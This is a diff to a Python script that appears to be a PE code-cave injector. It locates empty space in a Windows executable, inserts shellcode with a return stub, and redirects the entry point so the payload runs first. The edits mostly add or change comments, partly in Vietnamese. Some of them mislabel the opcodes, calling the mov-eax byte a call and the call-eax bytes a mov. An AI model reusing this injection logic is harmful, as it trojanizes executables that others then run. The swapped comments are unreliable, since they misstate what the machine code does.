@@ -15,7 +15,7 @@ args = parser.parse_args()
 def FindCave():
     global pe
     filedata = open(file, "rb") # Doc File
-    print(" Min Cave Size: " + str(minCave) + " bytes")
+    print(" Min Cave Size (Size cua lo hong): " + str(minCave) + " bytes")
     # Set PE file Image Base
     image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
     caveFound = False
@@ -93,15 +93,15 @@ origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)
 pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
 returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')
 
-# INJECT
-shellcode += (b"\xB8" + returnAddress)
+# INJECT 
+shellcode += (b"\xB8" + returnAddress) #Call Eax dang chua EntryPoint
 paddingBytes = b""
 
-#Them padding vao sau Shellcode, dua eax vao va call eax
+#Them padding vao sau Shellcode, dua Entry Point vao` Eax
 if len(shellcode) % 4 != 0:
     paddingBytes = b"\x90" * 10
     shellcode += paddingBytes
-shellcode += (b"\xFF\xD0")
+shellcode += (b"\xFF\xD0") #Mov Eax
 
 #Them padding vao trước shellcode
 shellcode = b"\x90\x90\x90\x90" + shellcode 
